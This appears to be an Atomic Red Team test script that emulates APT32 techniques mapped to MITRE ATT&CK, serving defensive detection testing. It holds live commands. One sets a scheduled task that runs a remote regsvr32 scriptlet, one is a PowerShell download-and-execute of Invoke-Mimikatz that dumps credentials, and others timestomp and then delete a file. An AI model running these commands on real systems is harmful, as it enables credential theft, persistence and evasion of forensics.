:: https://attack.mitre.org/wiki/Group/G0050
:: xref: https://www.fireeye.com/blog/threat-research/2017/05/cyber-espionage-apt32.html
:: Thanks to Nick Carr for his research on this group
:: Sample Representation of ATT&CK Techniques used by APT32
:: Tactics: Execution, Persistence, Privilege Escalation
:: Create Scheduled Task With RegSv32 Payload
:: https://attack.mitre.org/wiki/Technique/T1053
SCHTASKS /Create /SC MINUTE /TN "Atomic Testing" /TR "regsvr32.exe /s /u /i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/Windows/Payloads/RegSvr32.sct scrobj.dll" /mo 30
SCHTASKS /Delete /TN "Atomic Testing" /F
:: Tactics: Execution
:: https://attack.mitre.org/wiki/Technique/T1086
powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/Windows/Payloads/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds"
:: Tactics: Defense Evasion
:: https://attack.mitre.org/wiki/Technique/T1099
:: Source: https://gist.github.com/obscuresec/7b0cf71d7a8dd5e7b54c
echo "Atomic Test File" > test.txt
PowerShell.exe -com {$file=(gi test.txt);$date='06/06/2006 12:12 pm';$file.LastWriteTime=$date;$file.LastAccessTime=$date;$file.CreationTime=$date}
:: Tactics: Defense Evasion
:: https://attack.mitre.org/wiki/Technique/T1107
:: Deletes File, detection here would be File Modificaiton
del test.txt
